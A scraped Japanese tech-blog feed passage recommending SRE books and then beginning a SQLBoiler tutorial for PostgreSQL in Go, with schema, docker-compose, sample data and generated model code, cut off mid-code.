この書籍では、セキュリティプログラムの設計方法、ソフトウェア配信の各フェーズでの意思決定、複雑なシステムダイナミクスの理解、システムにおける意思決定を歪める技術的および組織的トレードオフのナビゲート方法について解説しています。また、カオス実験を通じて、ソフトウェアの品質とセキュリティに関する重要な仮定を検証する方法にも焦点を当てています。 このアプローチにより、組織はセキュリティカオスエンジニアリングを利用して、システムのレジリエンスを高め、広範な攻撃から保護する方法を学ぶことができます。さらに、本書では大手企業がセキュリティカオスエンジニアリングをどのように活用しているかの事例も紹介しており、読者に現実的な応用の例を提供します。この書籍は、サイバーセキュリティの課題に直面している方にとって、非常に価値のあるリソースとなるでしょう。learning.oreilly.comBuilding Microservices, 2nd Edition新しいものが常に良いわけではありません。見掛けの進捗や成果を得るために、シンプルで高品質なものを手放す必要はありません。シンプルで高品質なモノリスは、価値あるものとして当然のように評価されるべきです。それでも、マイクロサービスへの移行が必要な場合には、「Building Microservices, 2nd Edition」を参照してください、Sam Newman氏による612ページに及ぶ包括的な書籍で、マイクロサービスの構築、管理、そしてスケーリングに関する幅広いトピックを扱っています。この書籍は、モデリング、統合、テスト、デプロイメント、監視などの最新のマイクロサービスソリューションに関して、明快な例と実用的なアドバイスを提供しています。技術の時間の経過とともの進化を追いながら、マイクロサービスに関する理解を深めるのに非常に役立ちます。マイクロサービスアーキテクチャ 第2版作者:Sam Newmanオライリー・ジャパンAmazon「Monolith to Microservices」は、マイクロサービスの理念と移行プロセスに関する実践的な内容に焦点を当てています。具体的なテクノロジーではなく、マイクロサービスへの移行を決定する基準や手順に関する経験に基づく指針を提供しており、読者にとって非常に理解しやすく、実務においても有益な情報が得られるでしょう。これらの書籍は、マイクロサービスアーキテクチャの理解を深め、実際のシステム設計や運用において役立つ貴重なリソースです。モノリスからマイクロサービスへ ―モノリスを進化させる実践移行ガイド作者:Sam NewmanオライリージャパンAmazon分散システムの信頼性を深めたい方には、『Go言語による分散サービス―信頼性、拡張性、保守性の高いシステムの構築』がおすすめです。この書籍は、データ集約型アプリケーションの設計における核心的な概念と技術を網羅的に解説し、信頼性の高い分散システム構築に必要な知識を詳細に説明しています。マイクロサービスの主軸を担うSREとして立ち回るためには、『データ指向アプリケーションデザイン』は絶対に読んでおくべき書籍です。この書籍は、分散システムの複雑さと信頼性を理解し、それらを適切に管理するための実践的な知識を提供しています。SREとしての能力を高め、システムの効率性と安定性を保つために、この書籍の学びを活用することが重要です。動画www.youtube.com発表資料 speakerdeck.comAPI Design Patterns「API Design Patterns」は、ウェブおよび内部APIの設計に関する包括的なガイドで、480ページにわたりAPIパターンの原則、リソースレイアウト、データ型の取り扱い、標準手法、セキュアなAPIのための認証・検証方法などを深く掘り下げています。GoogleのAPI専門家JJ Geewax氏によって執筆されたこの書籍は、一貫性とスケーラビリティを確保するためのAPIデザインパターンを示し、APIの基本から高度な機能、特殊なケースまでを網羅しています。読者は、APIの設計とリファクタリングに必要な知識と技術を学び、APIをより効果的に構築するための実用的なアプローチを得られます。learning.oreilly.com「Web APIの設計」はArnaud LauretによるAPI設計の実践ガイドです。この書籍では、使いやすく、柔軟で堅牢なAPIを構築する方法について詳しく解説されています。特に、コマースサイトの例を用いてデータの配置方法やAPIの拡張性の維持方法が紹介されており、実装を重視しないアプローチが特徴です。メンテナンス性やドキュメント作成の重要性も強調されています。この書籍を通じて、読者はAPIの設計と構築に必要な基本原則と実用的な手法を学ぶことができます。Web APIの設計作者:Arnaud Lauret翔泳社Amazon現代のSREというか運用では、APIやデータベースに関する知識が不可欠です。これらの技術の理解がなければ、トラブルシューティングやシステムアーキテクトとして効果的に立ち振る舞うことは困難です。APIやDBはシステムの基盤を形成し、その運用と最適化に深く関わっているため、これらの要素を熟知していないと、複雑な問題解決や効率的なシステム設計ができません。したがって、技術者はAPIとDBの知識を身につけ、常に最新のトレンドを追い続けることが重要です。Systems Performance, 2nd Edition「Systems Performance, 2nd Edition」は、システムパフォーマンスの専門家であるBrendan Greggによる928ページに及ぶ包括的な書籍です。Linuxベースのオペレーティングシステムを例に取りながら、オペレーティングシステム、ハードウェア、アプリケーションの理論を要約し、最新のツールやテクニックを用いたCPU、メモリ、ファイルシステム、ディスク、ネットワーキングの最適化やパフォーマンス分析の方法論を提供しています。クラウド環境でのパフォーマンス上の課題や、perf、Ftrace、BPF（BCCおよびbpftrace）を用いたプロファイリングとトレーシングなど、実践的な技術にも深く掘り下げています。詳解 システム・パフォーマンス 第2版作者:Brendan Greggオーム社Amazonさらに、日本語の読者にとっても、この書籍の日本語版が利用可能であることは大きな利点なので感謝しましょう。learning.oreilly.comEfficient GoSRE（Site Reliability Engineering）は、信頼性、スケーラビリティ、効率性を最大限に高めるために、システムとソフトウェアの設計、構築、運用に深く関与します。この分野で成功するためには、最新の技術トレンド、プログラミング言語、システム管理のベストプラクティスを継続的に学ぶことが不可欠です。今回紹介する書籍は、技術スタックが微妙に違ったとしてもSREが直面する多様な課題に対応するのに役立つ知識とスキルを提供します。「Efficient Go」は、O\'Reilly Media, Inc.から2022年11月に出版された502ページの書籍で、技術の進歩、急速な市場の変化、およびシステムの複雑化に伴い、しばしば避けがちなソフトウェア効率の問題に対処します。戦術的で可観測性に基づくパフォーマンスの最適化は、コスト削減とビジネス成功のためにすべての製品に不可欠です。著者のBartłomiej Płotkaは、システムを高速化し、リソースを少なく消費するために必要なツールと知識を提供し、Go言語を使用して日常的な効率性を向上させる方法をガイドします。また、この書籍は、効率性の目標を明確にし、最適化する方法、CPUやメモリなどの共通リソースを効果的に使用する方法、そして効率性を評価するためのメトリクス、ログ、トレース、(継続的な)プロファイリングを通じて、Prometheus、Jaeger、Parcaなどのオープンソースプロジェクトを使用する方法を含めています。また、Go言語のスライス、ジェネリクス、ゴルーチン、割り当てセマンティクス、ガベージコレクションなどの機能を効率的に使用する方法についても詳しく解説されています。learning.oreilly.com日本語の読者には嬉しいニュースがあります。これらの書籍は、日本語版も入手可能で、日本語話者が内容をより容易に理解し活用できるようになっています。効率的なGo ―データ指向によるGoアプリケーションの性能最適化作者:Bartłomiej PłotkaオライリージャパンAmazon「Cloud Native Go, 2nd Edition」は、O\'Reilly Media, Inc.から2024年10月に出版される520ページの書籍で、Go開発者がクラウドネイティブなアプリケーションの構成と構築を、低レベルのGo機能から中間レベルのパターン、高レベルのアーキテクチャの考慮事項に至るまで探求する内容が含まれています。初版もとても良い書籍だったので紹介しておきます。本書では、中級から上級の開発者がGoを使用して簡単だが完全に機能する分散型キーバリューストアを構築する方法を段階的に説明し、Goのジェネリクス、信頼性と可用性、メモリリーク、メッセージ指向ミドルウェアについて学ぶことができます。さらに、セキュリティと分散状態に関する新しい章は、安全な分散型クラウドネイティブアプリケーションを開発する上での重要な側面に焦点を当てています。この書籍を通じて、クラウドネイティブソフトウェアを構築するのに理想的な言語としてのGoの機能を理解し、スケーラブルな分散サービスを設計する際の課題の解決方法、チャネルやゴルーチンなどGoの低レベル機能を活用した信頼性の高いクラウドネイティブサービスの設計と実装、複雑な分散システムの効果的な構築と管理のためのパターン、抽象化、ツールの適用、およびGoを使用してクラウドネイティブサービスを構築し管理する際の障害の克服方法を学ぶことができます。learning.oreilly.com「Mastering Linux Shell Scripting」は、Packt Publishingから2018年4月に出版された284ページの書籍で、Bashシェルスクリプティングの複雑さをマスターし、企業でのシェルの力を解き放つための知識を提供します。この書籍は、Linux管理者やシステム管理者を対象にしており、日常のタスクを自動化し、時間と労力を節約したい方々に最適です。基本的なシェルスクリプティングとコマンドラインの経験が必要で、自動化したいタスクに精通していることが役立ちます。本書では、最初のBashスクリプトの作成、実行、デバッグ方法やユーザー入力を求めるインタラクティブなスクリプトの作成方法、複雑なウェブ設定ファイルを動的に編集するスクリプトの開発、AWKを使用したログファイルの検索と報告、関数をビルディングブロックとして使用する効果的なスクリプトの作成方法など、シェルスクリプティングのさまざまな側面を学ぶことができます。さらに、PythonなどBASHと異なるスクリプト言語の比較による情報に基づいた選択方法も提供されています。learning.oreilly.comこの本も日本語の書籍が必要があります。嬉しいですね。マスタリングLinuxシェルスクリプト 第2版 ―Linuxコマンド、bashスクリプト、シェルプログラミング実践入門作者:Mokhtar Ebrahim,Andrew Mallettオライリー・ジャパンAmazonImplementing Service Level Objectives「Implementing Service Level Objectives」は、サービスレベル目標（SLO）の専門家であるAlex Hidalgoによる402ページの詳細なガイドです。この書籍では、SLO文化をゼロから構築する方法について、実践的なアドバイスと詳細な分析を提供しています。読者は、ユーザーの視点からサービスの信頼性を意味深く測定するサービスレベル指標（SLI）を定義する方法、統計的・確率的分析を用いた適切なSLOターゲットの選択、エラーバジェットの利用、SLOに基づくアプローチに必要なツールとリソースの構築、そして組織のリーダーシップやユーザーに対してSLOデータを用いた意味のある報告をする方法を学びます。この書籍は、SLOベースの信頼性アプローチに取り組む組織の文化とツール作成に関心のあるすべての人にとって、理想的な入門書であるとおもいます。learning.oreilly.comさらに、日本語の読者にとっても、この書籍の日本語版が利用可能であることは大きな利点なので感謝しましょう。SLO サービスレベル目標 ―SLI、SLO、エラーバジェット導入の実践ガイド作者:Alex Hidalgoオーム社AmazonModern Software Engineering: Doing What Works to Build Better Software Faster「Modern Software Engineering: Doing What Works to Build Better Software Faster」は、連続的デリバリーの先駆者であるDavid Farleyによって書かれた、効果的なソフトウェア開発の本質を探求する256ページの書籍です。この本では、プログラマー、マネージャー、テックリードを対象に、ソフトウェア開発における「学習と探索」と「複雑性の管理」という二つの主要なテーマに注目し、マインドセットからコードの品質までを改善するための原則を提案しています。Farleyは、目指すべき目標の明確化、合理的な基準に基づくツールの選択、継続的な段階的進歩を促進するための作業とシステムの組織化、繁栄するシステムへの進行状況の評価など、多岐にわたるテーマを取り上げています。さらに、実験と経験主義からの学習、システムの複雑化に対する制御、厳格さと柔軟性のバランス、歴史と経験からの学び、良いソフトウェア開発アイデアと悪いものの区別など、具体的なアプローチを提供しています。この書籍は、より良いソフトウェアをより迅速に、そして楽しみながら作成するための実践的な洞察をソフトウェアプロフェッショナルに提供します。learning.oreilly.com日本語訳があるので喜んで呼びましょう！嬉しいですね！継続的デリバリーのソフトウェア工学　もっと早く、もっと良いソフトウェアを作るための秘訣作者:David Farley日経BPAmazon「Grokking Continuous Delivery」は、GoogleのエンジニアChristie Wilsonによって書かれた424ページに及ぶ書籍で、ソフトウェアのデリバリープロセスの自動化を解説しています。本書では、新規および既存プロジェクトのための効果的な連続デリバリー（CD）パイプラインの設計、ソフトウェアプロジェクトをリリース準備完了状態に保つ方法、効果的なテストの維持、複数アプリケーションにわたるCDのスケール化、パイプラインが適切なタイミングで正しいシグナルを提供することの確保、バージョンコントロールを信頼の原点として使用、そしてメトリクスを用いたデプロイメントの安全な自動化に焦点を当てています。この書籍は、CDパイプラインの設定と運用に関する実践的なガイドとして、ツールに依存しないアプローチを採用し、イラストや明快な説明、実践的な演習を通じてCDの設計と目的を解説しています。開発者やパイプラインデザイナーに向けたこの書籍は、CDを開発プロセスに追加したいソフトウェアエンジニアにとって理想的なリソースです。learning.oreilly.comLearning Test-Driven Development「Learning Test-Driven Development」は、277ページに及ぶSaleem Siddiqui著の書籍で、テスト駆動開発（TDD）をGo、JavaScript、Pythonの3つの言語で使用する方法を解説しています。この書籍は、コードがクリーンでエレガントであり、長期間にわたって機能し続けるためのTDDの活用方法を提供します。主な焦点は、ドメインの複雑さをユニットテスト駆動のアプローチで制御する方法、言語やテストフレームワーク、ドメイン概念を超えたTDDの機能、TDDが連続インテグレーションを可能にする方法、リファクタリングと再設計をTDDでサポートする方法にあります。加えて、JavaScriptでのシンプルかつ効果的なユニットテストハーネスの書き方、TDD中に生成されたユニットテストを用いた連続インテグレーション環境の設定についても学ぶことができます。この書籍は、Go、JavaScript、Pythonを使用してTDDを実践し、クリーンで整理されたコードを書くための実用的なガイドとなっています。learning.oreilly.com『Beyond Legacy Code』（邦題：レガシーコードからの脱却 ―ソフトウェアの寿命を延ばし価値を高める9つのプラクティス）は、レガシーコードとウォーターフォールモデルの問題点、アジャイルの導入と技術的卓越性の追求、小さなバッチでの開発の利点、協力し合う文化の重要性、テストファーストのアプローチとテスト駆動開発（TDD）の役割、設計を最後に行う創発的なアプローチ、レガシーコードのリファクタリング手法など、ソフトウェア開発における重要な9つのプラクティスを詳細に説明しています。この本は、ソフトウェア開発の現場で直面する問題に対処し、高品質なコードの作成を目指す開発者にとって貴重なガイドとなります。テスト駆動開発作者:ＫｅｎｔＢｅｃｋオーム社Amazon『Test Driven Development: By Example』は、テスト駆動開発（TDD）の導入によって、アプリケーション開発における恐怖を取り除くことを目指しています。著者Kent Beckは、TDDを通じてプログラマーが恐怖を克服し、より良いコミュニケーションと建設的な批判の受け入れを学ぶことができると考えています。TDDは、コードを継続的にテストしリファクタリングすることを基本としており、プログラマーが質の高い作業を行うための実践的な例を示しています。また、日本語版『テスト駆動開発』の翻訳者であるt_wadaさんのアカウントも非常に有益な情報源ですので、フォローすることをお勧めします。レガシーコードからの脱却 ―ソフトウェアの寿命を延ばし価値を高める9つのプラクティス作者:David Scott Bernsteinオライリー・ジャパンAmazonさらに、Kent Beckが最近書いた『Tidy First?』もオススメです。この本では、大規模なリファクタリングや作り直しではなくて雑然としたコードの「整頓」、すなわち読みやすくするためにコードを管理しやすいセクションに分割する方法について具体的なガイダンスを提供します。また、ソフトウェア設計の基本理論についての洞察も含まれており、いつどのようにコードを「整頓」するかについての実践的なアプローチが提案されています。プログラミング経験の向上や、大きな変更を小さく安全なステップで行う方法などについても掘り下げられています。learning.oreilly.com『Infrastructure as Code, 3rd Edition』は、Kief Morrisによって書かれた包括的な書籍で、Infrastructure as Code（IaC）の進化と主流化を背景にしています。この第三版では、組織の戦略的目標と課題をサポートするためのインフラストラクチャの設計と実装に焦点を当て、持続可能な成長のための成熟した基盤の構築の必要性を強調しています。本書では、宣言的および手続き的インフラストラクチャ言語の探求や、インフラストラクチャコードがプラットフォーム戦略とエンタープライズアーキテクチャにどう適合するか、そしてインフラストラクチャコードのテストと提供方法について探求しています。また、ソフトウェア設計とエンジニアリングからの教訓を活用して、成長を促進しつつ変化するニーズに適応できるようにインフラストラクチャコードベースを構築する方法についても解説されています。さらに、物理ハードウェアから仮想サーバー、クラウドネイティブクラスター、サーバーレスワークロードまで、現実世界のITシステムの複雑な風景をサポートするインフラストラクチャのパターンに焦点を当てています。この書籍は、自動化とクラウドを組み合わせ、アジャイルやDevOpsなどの先進的なアプローチを活用して、コンプライアンス、コスト、セキュリティ、運用品質の厳格なガバナンスを実現するワークフローと運用モデルについても紹介しており、テスト駆動開発（TDD） の観点からも、インフラストラクチャコードの品質と保守性を向上させるための重要な概念と実践を含んでいます。learning.oreilly.comシステム障害対応 実践ガイド『3カ月で改善！システム障害対応 実践ガイド』は、システム障害対応とプロセス改善の実践的なアプローチを提供する画期的な本です。著者の野村浩司氏と松浦修治氏は、それぞれNTTデータとリクルートでの豊富な経験を基に、実際の業務に即した方法を提供しています。本書の大きな特徴は、障害対応の具体的な手法を「メソッド化」している点です。理論だけでなく、「どうすればいいのか？」という実践的な問いに答えており、情報システム担当者や運用リーダーにとって最適な内容となっています。また、本書は障害対応の本質的価値にも触れています。障害対応の改善は、顧客満足度、従業員満足度、そして財務観点からもプラスの効果をもたらします。この点を丁寧に説明しており、運用担当者のモチベーション向上にも寄与する内容です。大規模な障害対応経験がない方でも、対応のイメージがつかめるように工夫されています。障害対応の難所にも言及し、読者が共感しやすい内容となっています。システム障害が起こりうるすべての現場の人々に推奨されるこの本は、システム障害対応をどのように捉え、判断し、対応するべきかについてのフローや表を豊富に掲載しています。これらは特にシステム障害マニュアルが整備されていないチームにとって非常に有用です。1000件以上の事例を分析し生み出されたこのメソッドは、障害対応改善のための役立つ雛形と共に、3カ月での改善を可能にします。インシデント分析から障害訓練まで、各プロセスに役立つ情報が満載です。システム障害対応における課題の特定から改善ステップまで、具体的なガイダンスを提供し、障害対応を改善するための実践的な指針を提供します。3カ月で改善！システム障害対応 実践ガイド インシデントの洗い出しから障害訓練まで、開発チームとユーザー企業の「協同」で現場を変える作者:野村 浩司,松浦 修治翔泳社AmazonWebエンジニアのための監視システム実装ガイドPractical Monitoringでも言及しましたし、ここまで読んでいるWebエンジニアにとって、システムの監視は不可欠なのは自明です。どれだけ高度な技術で構築されても、システムは放置すると壊れたり、理解しがたい状態に陥ることがあります。「Webエンジニアのための監視システム実装ガイド」は、監視テクノロジの動向から組織での実装まで、現場目線で解説する実用書です。最新ツールの説明から実装パターンの紹介、組織での実装に向けた態勢づくりまで、監視に必要な情報が網羅されています。本書は、監視システムの設計から導入、運用に至るまでの全てを包括的に理解するのに役立ちます。特にインシデント対応の実践的な知識や心構え、監視システムのアーキテクチャ例には注目です。また、MSPでの経験から得られた貴重なノウハウが詰まっており、既存の監視システムの知識を現代的なものにアップデートしたい方にも最適でタイパが最高に良い書籍です。Webエンジニアのための監視システム実装ガイド (Compass Booksシリーズ)作者:馬場 俊彰マイナビ出版AmazonSRE サイトリライアビリティエンジニアリングが”ザックリ”「すっきり」分かる本この書籍は、SRE（サイトリライアビリティエンジニアリング）の概念を分かりやすく説明しています。特にGoogleの事例を中心に、どのようにして大規模なサービスを安全かつ迅速にリリースし続けるかを示しています。SREがGoogle独自の手法ではなく、広くクラウドを利用する企業やエンジニアにとっても役立つ内容である点が強調されています。本書は、DevOpsを担当する方々、アプリケーション開発者、さらにはプログラミング未経験者にもSREという考え方を理解しやすくしています。その結果、「ざっくりなんとなくわかる」ような浅い理解を超えて、「すっきり」した理解を得ることができ、タイパを求める読者にとっては「最高」の参考書となります。SRE サイトリライアビリティエンジニアリングが”ザックリ”「すっきり」分かる本: Googleが実践している新DevOps方法論作者:GGtop.jpAmazonさいごに情報技術の世界は日々進化しており、特にSRE分野では新たな知識と技術の習得が不可欠です。当ブログではSREにおける効率的な学習（タイパ）に役立つ書籍を多数紹介してきました。これらの資料が、読者の皆様のSREに対する理解の深化と実務能力の向上に貢献することを願っています。さらに、紹介した本にとどまらず、他にも多くの優れた書籍が存在しますので、是非探求してみてください。また、優先順位をどうしてもつけてほしいという人がいる場合はDevOps Roadmapがある参考にするといいと思います。私が所属する株式会社スリーシェイクでは、好奇心が強く手が動くエンジニアを求めています。私たちはSRE分野における多岐にわたる支援を提供しており、興味のある方は是非お問い合わせください。詳細は公式サイトでご覧いただけます。来年は当ブログでDevOpsやPlatform Engineeringの分野に焦点を当てる予定です。これらの分野は技術進歩が著しく、常に新しいアプローチやベストプラクティスが登場しています。それらをいかに実務に応用するかについて、深く掘り下げていきたいと考えています。私は「現場がさき、プラクティスがあと、原則をだいじに」という考え方を重視しており、適切な専門性と多様な事例に基づく知見を持ちながらも、業界全体での普及が十分でない現状があります。このため、時には根拠の不十分な「最強のDevOps」や「SREに外側だけ準じた独自のアプローチ」のような概念が生まれがちです。これは業界における深い理解と適切なプラクティスの普及に向けた取り組みが必要であることを示しています。このブログを読んでくださった皆様に心から感謝いたします。私たちは、SREの世界での成長と発展を目指し、皆様と一緒に学び続けることを楽しみにしています。ブログの購読をお願いすることで、私たちのモチベーションにも繋がります。次回の更新を楽しみにしていてください！","link":"https://syu-m-5151.hatenablog.com/entry/2024/01/26/165255","isoDate":"2024-01-26T07:52:55.000Z","dateMiliSeconds":1706255575000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Google Cloudコスト増減の定期監視とアドバイスを行うCostChecker-Agentの紹介","contentSnippet":"1. はじめに はじめまして、Sreake事業部インターン生の井上です。私はSreake事業部にてSRE技術の調査と研究を行う目的で2023年3月6日から長期インターン生として参加しています。 この記事では、” […]The post Google Cloudコスト増減の定期監視とアドバイスを行うCostChecker-Agentの紹介 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/google-cloud-cost-checker-agent/","isoDate":"2024-01-25T02:17:39.000Z","dateMiliSeconds":1706149059000,"authorName":"Sreake","authorId":"Sreake"},{"title":"SQLBoilerによるPostgreSQLの操作についての話","contentSnippet":"はじめにデータベースは、現代のアプリケーション開発において不可欠な要素です。特にリレーショナルデータベースは、その整合性と信頼性から幅広い用途で使用されています。しかし、リレーショナルデータベースを効率的に操作するためには、複雑なSQLクエリを記述し、アプリケーションのコードとデータベースのスキーマを適切に統合する必要があります。この作業は開発者にとって時間と労力を要するものです。この背景から、ORM（Object-Relational Mapping）ライブラリの利用が一般的になりました。ORMライブラリは、プログラミング言語のオブジェクトとデータベースレコードをマッピングし、SQLクエリの生成を抽象化して開発者がデータベース操作を容易に行えるようにサポートします。この記事では、Go言語でのデータベース操作を効率化するためのORMライブラリ「SQLBoiler」の活用方法について解説します。SQLBoilerは、Go言語に特化した強力なORMライブラリで、データベーススキーマに基づいてGoのコードを自動生成します。この自動生成機能により、開発者は煩雑なボイラープレートコードの記述を削減し、ビジネスロジックに集中できるようになります。本記事では、SQLBoilerの基本的な使用方法から生成されたコードの実際の利用方法までを段階的に紹介します。それでは、SQLBoilerを活用してGo言語でのデータベース操作を効率化する方法を見ていきましょう。ORM（Object-Relational Mapping）についてORMは、リレーショナルデータベースとプログラミング言語の間の橋渡しをする技術です。通常のデータベース操作に使用されるSQLとは異なり、ORMはプログラムのオブジェクト（今回のGoでは構造体）とデータベースレコードを自動で関連付け、SQL文の組み立てを可能にします。SQLBoilerの利点SQLBoilerはGo言語に特化した強力なORMライブラリで、データベーススキーマから直接Goのコードを生成します。この自動生成機能により、ボイラープレートコードの削減と開発効率の向上が図れます。ボイラープレートコードとはいくつかの異なるコンテキストでほとんどまたはまったく変更せずに再利用できるコンピュータ言語のテキストのことを指します。SQLBoilerの使用方法SQLBoilerを利用する際は、まずデータベーススキーマを定義します。以下は、著者、出版社、利用者、書籍、貸出記録を管理するスキーマの例です。-- 著者テーブルcreate table authors (  author_id serial primary key,  name varchar(100) not null);-- 出版社テーブルcreate table publishers (  publisher_id serial primary key,  name varchar(100) not null);-- 利用者テーブルcreate table users (  user_id serial primary key,  family_name varchar(100) not null,  given_name varchar(100) not null,  email_address varchar(254) not null,  registration_date date not null);-- メールアドレスに対するユニークキー制約（ユニークインデックス）create unique index idx_users_email_address on users(email_address);-- 書籍テーブルcreate table books (  book_id serial primary key,  title varchar(255) not null,  author_id integer not null,  publisher_id integer not null,  isbn varchar(20),  year_published integer);-- 貸出記録テーブルcreate table loans (  loan_id serial primary key,  book_id integer not null,  user_id integer not null,  loan_date date not null,  return_date date);-- 外部キー制約の追加alter table books add constraint fk_books_author_id foreign key (author_id) references authors(author_id);alter table books add constraint fk_books_publisher_id foreign key (publisher_id) references publishers(publisher_id);alter table loans add constraint fk_loans_book_id foreign key (book_id) references books(book_id);alter table loans add constraint fk_loans_user_id foreign key (user_id) references users(user_id);このスキーマをもとに、SQLBoilerはGoのモデル、クエリビルダー、CRUD操作を自動生成します。この自動生成により、開発者は細かなデータベース操作を手作業で行う必要がなく、ビジネスロジックに集中できます。環境構築Dockerを使用して、PostgreSQLのバージョン16を動作させる環境を構築します。以下のdocker-compose.yamlファイルを使用してPostgreSQLサーバーを立ち上げます。version: \'3\'services:  postgres:    container_name: postgres    image: postgres:16    restart: always    ports:      - \\"5432:5432\\"    environment:      POSTGRES_USER: \\"postgres\\"      POSTGRES_PASSWORD: \\"postgres\\"サンプルデータの投げ込みv01_insert.sql を作成します-- 著者テーブルにサンプルデータを挿入INSERT INTO authors (name) VALUES (\'Sample Author 1\');INSERT INTO authors (name) VALUES (\'Sample Author 2\');INSERT INTO authors (name) VALUES (\'Sample Author 3\');-- 出版社テーブルにサンプルデータを挿入INSERT INTO publishers (name) VALUES (\'Sample Publisher 1\');INSERT INTO publishers (name) VALUES (\'Sample Publisher 2\');INSERT INTO publishers (name) VALUES (\'Sample Publisher 3\');-- 利用者テーブルにサンプルデータを挿入INSERT INTO users (family_name, given_name, email_address, registration_date) VALUES (\'Yamada\', \'Taro\', \'taro@example.com\', \'2021-01-01\');INSERT INTO users (family_name, given_name, email_address, registration_date) VALUES (\'Suzuki\', \'Hanako\', \'hanako@example.com\', \'2021-02-01\');INSERT INTO users (family_name, given_name, email_address, registration_date) VALUES (\'Tanaka\', \'Ichiro\', \'ichiro@example.com\', \'2021-03-01\');-- 書籍テーブルにサンプルデータを挿入INSERT INTO books (title, author_id, publisher_id, isbn, year_published) VALUES (\'Sample Book 1\', 1, 1, \'1234567890\', 2021);INSERT INTO books (title, author_id, publisher_id, isbn, year_published) VALUES (\'Sample Book 2\', 2, 2, \'0987654321\', 2020);INSERT INTO books (title, author_id, publisher_id, isbn, year_published) VALUES (\'Sample Book 3\', 3, 3, \'1122334455\', 2022);-- 貸出記録テーブルにサンプルデータを挿入INSERT INTO loans (book_id, user_id, loan_date, return_date) VALUES (1, 1, \'2022-01-01\', \'2022-01-15\');INSERT INTO loans (book_id, user_id, loan_date, return_date) VALUES (2, 2, \'2022-01-05\', \'2022-01-20\');INSERT INTO loans (book_id, user_id, loan_date) VALUES (3, 3, \'2022-01-10\');投げ込み投げ込みpsql -h localhost -U postgres -d postgres -f v01_insert.sqlSQLBoilerのインストールSQLBoilerのインストール手順は以下の通りです。go install github.com/volatiletech/sqlboiler/v4@latestgo install github.com/volatiletech/sqlboiler/v4/drivers/sqlboiler-psql@latestPostgreSQL接続情報の設定（YAML形式）psql:  dbname: \\"postgres\\"  host: \\"127.0.0.1\\"  port: 5432  user: \\"postgres\\"  pass: \\"postgres\\"  sslmode: \\"disable\\"  whitelist:    - \\"authors\\"    - \\"publishers\\"    - \\"users\\"    - \\"books\\"    - \\"loans\\"whitelistにはコード生成の対象となるテーブルを明示的に指定します。この例では、著者、出版社、利用者、書籍、貸出記録の各テーブルを指定しています。SQLBoilerによるコード生成以下のコマンドを使うことで、SQLBoilerは指定されたデータベーススキーマに基づいてGoのモデルを生成します。sqlboiler psql -c config/database.yaml -o models --no-testsこのコマンドは、config/database.yamlに指定された設定を使用して、modelsディレクトリ内にモデルファイルを生成します。--no-testsオプションにより、テストファイルの生成をスキップします。生成されたファイル構成は以下の通りです。models/├── authors.go├── boil_queries.go├── boil_table_names.go├── boil_types.go├── boil_view_names.go├── books.go├── loans.go├── psql_upsert.go├── publishers.go└── users.go生成されたファイルの解説例として、books.goファイルの一部を見てみましょう。このファイルはデータベースのbooksテーブルに対応するGoの構造体と、それに関連する関数を定義しています。Book構造体type Book struct {    BookID        int         `boil:\\"book_id\\" json:\\"book_id\\" toml:\\"book_id\\" yaml:\\"book_id\\"`    Title         string      `boil:\\"title\\" json:\\"title\\" toml:\\"title\\" yaml:\\"title\\"`    AuthorID      int         `boil:\\"author_id\\" json:\\"author_id\\" toml:\\"author_id\\" yaml:\\"author_id\\"`    PublisherID   int         `boil:\\"publisher_id\\" json:\\"publisher_id\\" toml:\\"publisher_id\\" yaml:\\"publisher_id\\"`    Isbn          null.String `boil:\\"isbn\\" json:\\"isbn,omitempty\\" toml:\\"isbn\\" yaml:\\"isbn,omitempty\\"`    YearPublished null.Int    `boil:\\"year_published\\" json:\\"year_published,omitempty\\" toml:\\"year_published\\" yaml:\\"year_published,omitempty\\"`}Book構造体はbooksテーブルの各列をフィールドとして持ち、タグを用いてデータベースの列名とのマッピングを定義しています。SQLBoilerによるコード生成の詳細解説SQLBoilerによって生成されたモデルファイルは、リレーショナルデータベースと連携するための多様な機能を提供します。ここでは、具体的なコード例を使って、関連関数やリレーションシップ、フックについて解説します。生成されたファイルには、CRUD操作（作成、読み取り、更新、削除）を行うための関数も含まれています。例えば、Insert関数はBookオブジェクトをデータベースに挿入し、Update関数は既存のレコードを更新します。また、Delete関数はレコードを削除し、Reload関数はデータベースから最新の情報を再読み込みします。関連関数の例// Insert a single record using an executor.func (o *Book) Insert(ctx context.Context, exec boil.ContextExecutor, columns boil.Columns) error {    // ...関数の本体...}// Update uses an executor to update the Book.func (o *Book) Update(ctx context.Context, exec boil.ContextExecutor, columns boil.Columns) (int64, error) {    // ...関数の本体...}// Delete deletes a single Book record with an executor.func (o *Book) Delete(ctx context.Context, exec boil.ContextExecutor) (int64, error) {    // ...関数の本体...}// Reload refetches the object from the database.func (o *Book) Reload(ctx context.Context, exec boil.ContextExecutor) error {    // ...関数の本体...}これらの関数は、Bookオブジェクトを使用して、データベースに対する挿入、更新、削除、再読み込みの操作を行います。リレーションシップの例// Author pointed to by the foreign key.func (o *Book) Author(mods ...qm.QueryMod) authorQuery {    // ...関数の本体...}// Publisher pointed to by the foreign key.func (o *Book) Publisher(mods ...qm.QueryMod) publisherQuery {    // ...関数の本体...}これらの関数は、Bookオブジェクトが参照する外部キー（Author, Publisher）に基づいて、関連するデータを取得するためのクエリを作成します。SQLBoilerはテーブル間のリレーションシップを認識し、それに対応する関数も生成します。例えば、BookがAuthorとPublisherに関連している場合、それぞれのリレーションシップに対応するLoadAuthorやLoadPublisherなどの関数が生成されます。フックの例// AddBookHook registers your hook function for all future operations.func AddBookHook(hookPoint boil.HookPoint, bookHook BookHook) {    // ...関数の本体...}フックを使用すると、データベース操作の前後に特定の処理を実行できます。例えば、AddBookHook関数は、特定のタイミングで実行されるカスタムフックを登録します。SQLBoilerは各CRUD操作の前後に実行されるフック（Hook）もサポートしています。これにより、データベース操作の前後にカスタムロジックを実行することが可能です。SQLBoilerの応用と実践的な利用方法Go言語とSQLBoilerを使用して、リレーショナルデータベースでのデータ操作を行う方法を解説します。この記事では、実際のコードを使用して、SQLBoilerで生成されたモデルを利用してデータベースの書籍テーブルを操作する一連のプロセスを紹介します。主にSelect、Insert、Update、Upsert、Delete、Reloadといった基本的なデータベース操作をカバーし、Eager Loadingやデバッグ出力などの高度な機能についても触れます。以下のサンプルコードは、PostgreSQLデータベースに接続し、複数の異なる操作を実行するGoプログラムです。このプログラムでは、SQLBoilerで生成されたモデルを使用して、書籍の情報を取得、挿入、更新、アップサート、削除し、データベースの状態を再読み込みする操作を行います。package 